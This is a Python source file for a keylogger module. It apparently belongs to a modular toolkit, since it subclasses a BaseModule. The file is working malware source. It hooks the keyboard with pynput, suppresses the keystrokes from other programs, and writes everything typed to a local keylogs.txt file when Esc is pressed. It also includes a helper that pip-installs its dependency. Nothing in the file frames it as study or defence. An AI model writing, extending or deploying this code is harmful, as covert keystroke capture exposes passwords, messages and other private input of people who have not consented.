import os
import subprocess
from basemodule import BaseModule
from pynput.keyboard import Key, Listener


class Keylogger(BaseModule):
    def __init__(self):
        self.keys = []

    def on_press(self, key):
        self.keys.append(key)

    def on_release(self, key):
        if key == Key.esc:
            self.write_to_file(self.keys)
            return False

    def write_to_file(self, keys):
        keylog_dir = "../keylogs"
        if not os.path.exists(keylog_dir):
            os.makedirs(keylog_dir)

        keylogs_file_path = os.path.join(keylog_dir, "keylogs.txt")
        with open(keylogs_file_path, "a") as keylog_file:
            for key in keys:
                keylog_file.write(str(key))

    def run(self):
        with Listener(on_press=self.on_press, on_release=self.on_release, suppress=True) as listener:
            listener.join()

    def install_requirements(self):
        libraries = ["pynput"]
        for library in libraries:
            subprocess.check_call(["pip", "install", library])